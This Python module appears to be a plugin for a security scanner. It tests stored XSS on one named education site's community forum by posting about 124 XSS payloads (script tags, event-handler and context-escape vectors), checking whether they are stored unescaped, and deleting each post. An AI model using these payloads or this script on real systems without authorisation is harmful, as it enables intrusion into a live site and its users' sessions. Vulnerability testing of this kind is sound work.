"""새싹에듀 XSS — 최종 단일 모듈(커뮤니티 저장형, 등록→확인→자동삭제).

sesacedu.store 는 React SPA + JSON API 라 서버측 '반사형' 표면이 없고, 실제 XSS 는
커뮤니티 게시판 저장형에서 난다. 이 한 파일로 끝낸다 — 다른 파일 의존 없음.

흐름(로그인 필요, Bearer 토큰은 대상 인증 헤더에서 같은 호스트 요청에 자동 주입):
  등록  POST   /backend/forum/posts      {category,title,content}  -> result.postId
  조회  GET    /backend/forum/{postId}   -> result.post.content / contentFormat
  삭제  DELETE /backend/forum/{postId}   (확인 직후 자동, 항상 시도)

테스트 입력값 = 고전/탈출 payload 24개(<script>·<img>·속성/스크립트/textarea 탈출 등)
             + 자동 발화 조합 100개. 결과에 '넣은 입력값' 을 모두 남긴다.
쓰기/삭제를 보낸다 — 삭제 가능한 테스트 환경에서만, write_ack 에 WRITE 를 넣어야 돈다.
"""
import json

from dashboard import core, probe
from dashboard.core import Finding


HANDLER = "console.log('{T}')"


# 고전/탈출 payload — 출력이 이스케이프되지 않는 경우를 노린다
CLASSIC_VECTORS = (
    ('script', 'HTML 본문', '<script>{H}</script>'),
    ('script', '대소문자 변형', '<ScRiPt>{H}</ScRiPt>'),
    ('script', '공백 변형', '<script >{H}</script >'),
    ('img', 'HTML 본문(따옴표 없음)', '<img src=x onerror={H}>'),
    ('img', 'HTML 본문(따옴표)', '<img src="x" onerror="{H}">'),
    ('svg', 'HTML 본문', '<svg onload={H}>'),
    ('svg', '자가닫힘', '<svg/onload={H}>'),
    ('body', 'HTML 본문', '<body onload={H}>'),
    ('iframe', 'javascript: 스킴', '<iframe src="javascript:{H}"></iframe>'),
    ('a', 'javascript: 스킴', '<a href="javascript:{H}">x</a>'),
    ('attr', '속성 탈출(겹따옴표)', '"><script>{H}</script>'),
    ('attr', '속성 탈출(홑따옴표)', "'><script>{H}</script>"),
    ('attr', '속성 탈출(img)', '"><img src=x onerror={H}>'),
    ('attr', '속성 내 이벤트 주입', '" onmouseover="{H}" x="'),
    ('attr', '속성 내 autofocus', '" autofocus onfocus="{H}" x="'),
    ('script-ctx', '스크립트 문자열 탈출', "';{H};//"),
    ('script-ctx', '스크립트 블록 탈출', '</script><script>{H}</script>'),
    ('textarea', 'textarea 탈출', '</textarea><script>{H}</script>'),
    ('title', 'title 탈출', '</title><script>{H}</script>'),
    ('comment', 'HTML 주석 탈출', '--><script>{H}</script>'),
    ('img', 'onerror 슬래시 변형', '<img src=x onerror={H}//>'),
    ('details', 'ontoggle', '<details open ontoggle={H}><summary>x</summary></details>'),
    ('marquee', 'onstart', '<marquee onstart={H}>x</marquee>'),
    ('input', 'autofocus onfocus', '<input autofocus onfocus={H}>'),
)

# 자동 발화 조합(마우스·키보드 조작 없이 실행)
VECTORS = (
    ('img', 'onerror', '<img src="data:," onerror="{H}">'),
    ('img', 'onload', '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACwAAAAAAQABAAA=" onload="{H}">'),
    ('svg', 'onload', '<svg onload="{H}"></svg>'),
    ('iframe', 'onload', '<iframe src="about:blank" onload="{H}"></iframe>'),
    ('body', 'onload', '<body onload="{H}">'),
    ('body', 'onpageshow', '<body onpageshow="{H}">'),
    ('script', 'onerror', '<script src="/vcd-nonexistent.js" onerror="{H}"></script>'),
    ('link', 'onerror', '<link rel="stylesheet" href="/vcd-nonexistent.css" onerror="{H}">'),
    ('link', 'onload', '<link rel="stylesheet" href="data:text/css," onload="{H}">'),
    ('object', 'onerror', '<object data="/vcd-nonexistent" onerror="{H}"></object>'),
    ('input', 'onerror', '<input type="image" src="data:," onerror="{H}">'),
    ('video', 'onerror', '<video src="data:," onerror="{H}"></video>'),
    ('video', 'onloadstart', '<video src="data:video/mp4," onloadstart="{H}"></video>'),
    ('audio', 'onerror', '<audio src="data:," onerror="{H}"></audio>'),
    ('audio', 'onloadstart', '<audio src="data:audio/mpeg," onloadstart="{H}"></audio>'),
    ('details', 'ontoggle', '<details open ontoggle="{H}"><summary>x</summary></details>'),
    ('animate', 'onbegin', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="1s" onbegin="{H}"/></rect></svg>'),
    ('animate', 'onend', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="0.2s" onend="{H}"/></rect></svg>'),
    ('animate', 'onrepeat', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="0.2s" repeatCount="2" onrepeat="{H}"/></rect></svg>'),
    ('set', 'onbegin', '<svg><set attributeName="x" to="1" dur="1s" onbegin="{H}"/></svg>'),
    ('set', 'onend', '<svg><set attributeName="x" to="1" dur="0.2s" onend="{H}"/></svg>'),
    ('animatetransform', 'onbegin', '<svg><rect><animateTransform attributeName="transform" type="scale" from="1" to="2" dur="1s" onbegin="{H}"/></rect></svg>'),
    ('animatemotion', 'onbegin', '<svg><rect><animateMotion dur="1s" onbegin="{H}"/></rect></svg>'),
    ('input', 'onfocus', '<input autofocus onfocus="{H}">'),
    ('textarea', 'onfocus', '<textarea autofocus onfocus="{H}"></textarea>'),
    ('select', 'onfocus', '<select autofocus onfocus="{H}"><option>x</option></select>'),
    ('button', 'onfocus', '<button autofocus onfocus="{H}">x</button>'),
    ('keygen', 'onfocus', '<keygen autofocus onfocus="{H}">'),
    ('a', 'onfocus', '<a tabindex="1" autofocus onfocus="{H}">x</a>'),
    ('div', 'onfocus', '<div tabindex="1" autofocus onfocus="{H}">x</div>'),
    ('span', 'onfocus', '<span tabindex="1" autofocus onfocus="{H}">x</span>'),
    ('section', 'onfocus', '<section tabindex="1" autofocus onfocus="{H}">x</section>'),
    ('article', 'onfocus', '<article tabindex="1" autofocus onfocus="{H}">x</article>'),
    ('p', 'onfocus', '<p tabindex="1" autofocus onfocus="{H}">x</p>'),
    ('label', 'onfocus', '<label tabindex="1" autofocus onfocus="{H}">x</label>'),
    ('strong', 'onfocus', '<strong tabindex="1" autofocus onfocus="{H}">x</strong>'),
    ('em', 'onfocus', '<em tabindex="1" autofocus onfocus="{H}">x</em>'),
    ('b', 'onfocus', '<b tabindex="1" autofocus onfocus="{H}">x</b>'),
    ('i', 'onfocus', '<i tabindex="1" autofocus onfocus="{H}">x</i>'),
    ('u', 'onfocus', '<u tabindex="1" autofocus onfocus="{H}">x</u>'),
    ('mark', 'onfocus', '<mark tabindex="1" autofocus onfocus="{H}">x</mark>'),
    ('small', 'onfocus', '<small tabindex="1" autofocus onfocus="{H}">x</small>'),
    ('h1', 'onfocus', '<h1 tabindex="1" autofocus onfocus="{H}">x</h1>'),
    ('h2', 'onfocus', '<h2 tabindex="1" autofocus onfocus="{H}">x</h2>'),
    ('h3', 'onfocus', '<h3 tabindex="1" autofocus onfocus="{H}">x</h3>'),
    ('h4', 'onfocus', '<h4 tabindex="1" autofocus onfocus="{H}">x</h4>'),
    ('h5', 'onfocus', '<h5 tabindex="1" autofocus onfocus="{H}">x</h5>'),
    ('h6', 'onfocus', '<h6 tabindex="1" autofocus onfocus="{H}">x</h6>'),
    ('li', 'onfocus', '<li tabindex="1" autofocus onfocus="{H}">x</li>'),
    ('td', 'onfocus', '<td tabindex="1" autofocus onfocus="{H}">x</td>'),
    ('th', 'onfocus', '<th tabindex="1" autofocus onfocus="{H}">x</th>'),
    ('blockquote', 'onfocus', '<blockquote tabindex="1" autofocus onfocus="{H}">x</blockquote>'),
    ('pre', 'onfocus', '<pre tabindex="1" autofocus onfocus="{H}">x</pre>'),
    ('code', 'onfocus', '<code tabindex="1" autofocus onfocus="{H}">x</code>'),
    ('nav', 'onfocus', '<nav tabindex="1" autofocus onfocus="{H}">x</nav>'),
    ('main', 'onfocus', '<main tabindex="1" autofocus onfocus="{H}">x</main>'),
    ('aside', 'onfocus', '<aside tabindex="1" autofocus onfocus="{H}">x</aside>'),
    ('header', 'onfocus', '<header tabindex="1" autofocus onfocus="{H}">x</header>'),
    ('footer', 'onfocus', '<footer tabindex="1" autofocus onfocus="{H}">x</footer>'),
    ('figure', 'onfocus', '<figure tabindex="1" autofocus onfocus="{H}">x</figure>'),
    ('cite', 'onfocus', '<cite tabindex="1" autofocus onfocus="{H}">x</cite>'),
    ('time', 'onfocus', '<time tabindex="1" autofocus onfocus="{H}">x</time>'),
    ('data', 'onfocus', '<data tabindex="1" autofocus onfocus="{H}">x</data>'),
    ('div', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><div style="animation:vcdkf 1s" onanimationstart="{H}">x</div>'),
    ('span', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><span style="animation:vcdkf 1s" onanimationstart="{H}">x</span>'),
    ('p', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><p style="animation:vcdkf 1s" onanimationstart="{H}">x</p>'),
    ('a', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><a style="animation:vcdkf 1s" onanimationstart="{H}">x</a>'),
    ('section', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><section style="animation:vcdkf 1s" onanimationstart="{H}">x</section>'),
    ('article', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><article style="animation:vcdkf 1s" onanimationstart="{H}">x</article>'),
    ('strong', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><strong style="animation:vcdkf 1s" onanimationstart="{H}">x</strong>'),
    ('em', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><em style="animation:vcdkf 1s" onanimationstart="{H}">x</em>'),
    ('b', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><b style="animation:vcdkf 1s" onanimationstart="{H}">x</b>'),
    ('i', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><i style="animation:vcdkf 1s" onanimationstart="{H}">x</i>'),
    ('u', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><u style="animation:vcdkf 1s" onanimationstart="{H}">x</u>'),
    ('mark', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><mark style="animation:vcdkf 1s" onanimationstart="{H}">x</mark>'),
    ('small', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><small style="animation:vcdkf 1s" onanimationstart="{H}">x</small>'),
    ('h1', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h1 style="animation:vcdkf 1s" onanimationstart="{H}">x</h1>'),
    ('h2', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h2 style="animation:vcdkf 1s" onanimationstart="{H}">x</h2>'),
    ('h3', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h3 style="animation:vcdkf 1s" onanimationstart="{H}">x</h3>'),
    ('h4', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h4 style="animation:vcdkf 1s" onanimationstart="{H}">x</h4>'),
    ('h5', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h5 style="animation:vcdkf 1s" onanimationstart="{H}">x</h5>'),
    ('h6', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h6 style="animation:vcdkf 1s" onanimationstart="{H}">x</h6>'),
    ('li', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><li style="animation:vcdkf 1s" onanimationstart="{H}">x</li>'),
    ('td', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><td style="animation:vcdkf 1s" onanimationstart="{H}">x</td>'),
    ('th', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><th style="animation:vcdkf 1s" onanimationstart="{H}">x</th>'),
    ('tr', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><tr style="animation:vcdkf 1s" onanimationstart="{H}">x</tr>'),
    ('blockquote', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><blockquote style="animation:vcdkf 1s" onanimationstart="{H}">x</blockquote>'),
    ('pre', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><pre style="animation:vcdkf 1s" onanimationstart="{H}">x</pre>'),
    ('code', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><code style="animation:vcdkf 1s" onanimationstart="{H}">x</code>'),
    ('nav', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><nav style="animation:vcdkf 1s" onanimationstart="{H}">x</nav>'),
    ('main', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><main style="animation:vcdkf 1s" onanimationstart="{H}">x</main>'),
    ('aside', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><aside style="animation:vcdkf 1s" onanimationstart="{H}">x</aside>'),
    ('header', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><header style="animation:vcdkf 1s" onanimationstart="{H}">x</header>'),
    ('footer', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><footer style="animation:vcdkf 1s" onanimationstart="{H}">x</footer>'),
    ('figure', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><figure style="animation:vcdkf 1s" onanimationstart="{H}">x</figure>'),
    ('figcaption', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><figcaption style="animation:vcdkf 1s" onanimationstart="{H}">x</figcaption>'),
    ('caption', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><caption style="animation:vcdkf 1s" onanimationstart="{H}">x</caption>'),
    ('ul', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><ul style="animation:vcdkf 1s" onanimationstart="{H}">x</ul>'),
    ('ol', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><ol style="animation:vcdkf 1s" onanimationstart="{H}">x</ol>'),
    ('dd', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><dd style="animation:vcdkf 1s" onanimationstart="{H}">x</dd>'),
)

# 고전 먼저, 그다음 자동. 기본값은 고전 세트 전부.
PAYLOADS = CLASSIC_VECTORS + VECTORS


META = {
    "id": "sesacedu_forum_stored_xss",
    "name": "새싹에듀 커뮤니티 저장형 XSS (등록→확인→자동삭제)",
    "category": "입력 검증",
    "vuln": "XSS",
    "kind": "active",
    "stage": "check",
    "roles": ["user_web", "practice"],
    "severity": "high",
    "attack": [
        {"tactic": "TA0002", "technique": "T1059.007",
         "name": "Command and Scripting Interpreter: JavaScript"},
    ],
    "description": (
        "커뮤니티 게시글에 XSS 조합을 등록하고, 조회 응답에 이스케이프 없이 그대로(contentFormat=HTML) "
        "저장됐는지 확인한 뒤, 만든 글을 바로 삭제합니다. 로그인(Bearer 토큰) 필요."
    ),
    "params": [
        {"name": "write_ack", "need": "required", "label": "쓰기 허용 확인", "default": "",
         "help": "글을 등록·삭제합니다. 삭제 가능한 테스트 환경에서만, 확인 칸에 WRITE 를 입력하세요."},
        {"name": "count", "need": "optional", "type": "int", "default": str(len(CLASSIC_VECTORS)),
         "label": "시험할 조합 수",
         "help": f"조합마다 글 1개를 만들고 확인 후 바로 지웁니다(한 번에 글 1개만 존재). "
                 f"앞쪽 {len(CLASSIC_VECTORS)}개는 고전/탈출 payload(<script>·<img>·속성 탈출 등), "
                 f"그 뒤는 자동 발화 조합입니다. 전체 {len(PAYLOADS)}개."},
        {"name": "start_vector", "need": "optional", "type": "int", "default": "1", "label": "시작 조합 번호",
         "help": f"1~{len(PAYLOADS)} 중 몇 번부터 시험할지. 1번은 <script> 입니다."},
        {"name": "category", "need": "optional", "label": "게시판 카테고리 코드", "default": "STUDY",
         "help": "등록 API 의 category 값. 예: STUDY"},
    ],
}

CREATE = "/backend/forum/posts"


def _clamp(value, lo, hi, default):
    try:
        return max(lo, min(int(value), hi))
    except (TypeError, ValueError):
        return default


def _post_id(resp):
    """등록 응답(JSON)에서 postId 를 꺼낸다. 없으면 None."""
    try:
        return json.loads(resp.body)["result"]["postId"]
    except (ValueError, KeyError, TypeError):
        return None


def _judge(resp, payload, marker):
    """조회 응답을 보고 (verdict, 설명). payload 가 그대로 + HTML 이면 취약."""
    try:
        post = (json.loads(resp.body).get("result") or {}).get("post") or {}
    except (ValueError, AttributeError):
        return "safe", "조회 응답이 예상한 JSON 형식이 아닙니다."
    content = post.get("content") or ""
    fmt = (post.get("contentFormat") or "").upper()
    if payload and payload in content:
        if fmt == "HTML":
            return "vuln", f"content 가 그대로 저장되고 contentFormat={fmt} 입니다 — 브라우저에서 실행됩니다."
        return "potential", f"content 가 그대로 저장됐으나 contentFormat={fmt or '없음'} (HTML 아님)."
    if marker in content:
        return "safe", "입력은 저장됐지만 특수문자가 이스케이프/변형됐습니다(정상 처리)."
    if marker in resp.body:
        return "potential", "표식이 응답에 있으나 content 필드에서 원문을 확인하지 못했습니다."
    return "safe", "조회 응답 content 에서 넣은 값을 찾지 못했습니다."


def _delete(base, pid):
    """만든 글을 지운다(항상 시도). 지웠으면 True."""
    try:
        d = core.fetch(f"{base}/backend/forum/{pid}", method="DELETE")
        return 200 <= d.status < 300
    except OSError:
        return False


SEVERITY = {"vuln": "high", "potential": "medium"}


def run(target, params):
    if (params.get("write_ack") or "").strip() != "WRITE":
        raise ValueError("쓰기 허용 확인 칸에 WRITE 를 입력해야 실행됩니다(글을 등록·삭제합니다).")
    count = _clamp(params.get("count"), 1, len(PAYLOADS), len(CLASSIC_VECTORS))
    start = _clamp(params.get("start_vector"), 1, len(PAYLOADS), 1)
    category = (params.get("category") or "STUDY").strip() or "STUDY"
    base = target.url.rstrip("/")

    findings = []
    delete_fail = []
    tried = []          # (번호, 태그, 문맥, payload, 판정) — 결과에 '무엇을 넣었는지' 남긴다
    tested = hits = 0
    for i in range(start - 1, min(start - 1 + count, len(PAYLOADS))):
        tag, event, template = PAYLOADS[i]
        marker = probe.marker()
        payload = template.replace("{H}", HANDLER.replace("{T}", marker))
        # 중립 텍스트를 덧붙인다: 서버가 태그만 걸러내면 content 가 빈 값이 되어 '내용 없음'
        # 으로 거부될 수 있다. 텍스트가 있으면 등록은 되고, payload 원문이 살아남는지로 판정한다.
        content = f"{payload}\nxss-test-{marker}"
        body = json.dumps({"category": category, "title": f"xss-test {marker}",
                           "content": content}, ensure_ascii=False).encode()

        created = core.fetch(base + CREATE, method="POST", raw_body=body,
                             content_type="application/json")
        pid = _post_id(created)
        if pid is None:
            if created.status in (401, 403):
                raise ValueError(
                    f"등록이 인증 거부({created.status})됐습니다. 대상 탭에서 로그인해 Bearer 토큰을 "
                    "인증 헤더에 넣은 뒤 다시 실행하세요.")
            raise ValueError(f"등록 응답에서 postId 를 찾지 못했습니다(HTTP {created.status}). "
                             f"카테고리 코드나 API 경로를 확인하세요. 응답: {created.body[:200]}")

        tested += 1
        read = None
        try:
            read = core.fetch(f"{base}/backend/forum/{pid}")
            verdict, detail = _judge(read, payload, marker)
        finally:
            if not _delete(base, pid):
                delete_fail.append(pid)

        deleted_note = (f"테스트 글(postId {pid})을 삭제했습니다."
                        if pid not in delete_fail else f"⚠ 삭제 실패 — postId {pid} 수동 삭제 필요.")
        tried.append((i + 1, tag, event, payload, verdict))
        if verdict in SEVERITY:
            hits += 1
            findings.append(Finding(
                title="커뮤니티 게시글 저장형 XSS" if verdict == "vuln"
                      else "커뮤니티 게시글 저장형 XSS 의심",
                severity=SEVERITY[verdict],
                location=f"{base}{CREATE} (content, 조합 {i + 1}: {tag}/{event})",
                evidence="\n".join([
                    f"조합 {i + 1}: {tag} / {event}",
                    f"넣은 content: {payload}",
                    f"등록 postId {pid} → 조회 응답 판정: {detail}",
                    deleted_note,
                    "HTTP 응답 기준입니다. 실제 실행은 브라우저로 해당 글을 열어 확인하세요.",
                ]),
                recommendation="저장/출력 시 사용자 입력을 이스케이프하거나, HTML 을 허용해야 한다면 "
                               "허용 태그 화이트리스트(sanitizer)를 적용하세요.",
                response=read))

    if delete_fail:
        findings.append(Finding(
            title="테스트 글 삭제 실패(수동 정리 필요)", severity="info",
            location=f"{base}/backend/forum",
            evidence="아래 postId 를 직접 삭제하세요: " + ", ".join(str(p) for p in delete_fail),
            recommendation="DELETE /backend/forum/{postId} 로 지우거나 화면에서 삭제하세요."))

    # 항상 '무엇을 넣었는지' 를 결과에 남긴다 — 취약이든 아니든 시험한 입력값 전체.
    label = {"vuln": "취약", "potential": "의심", "safe": "안전"}
    lines = [f"시험 {tested}개 · 취약/의심 {hits}건. 각 글은 등록 직후 삭제했습니다.",
             "넣은 입력값(payload):"]
    for n, tg, ctx, pl, vd in tried[:60]:
        one = pl.replace("\n", " ")
        lines.append(f"  [{label.get(vd, vd)}] {n} {tg}/{ctx}: {one[:100]}")
    if len(tried) > 60:
        lines.append(f"  …외 {len(tried) - 60}개는 요청 기록에서 확인하세요.")
    findings.append(Finding(
        title="저장형 XSS — 시험한 입력값 목록", severity="info",
        location=f"{base}{CREATE}",
        evidence="\n".join(lines),
        recommendation="취약 항목은 저장/출력 시 이스케이프 또는 허용 태그 화이트리스트(sanitizer)로 막으세요."))
    return findings
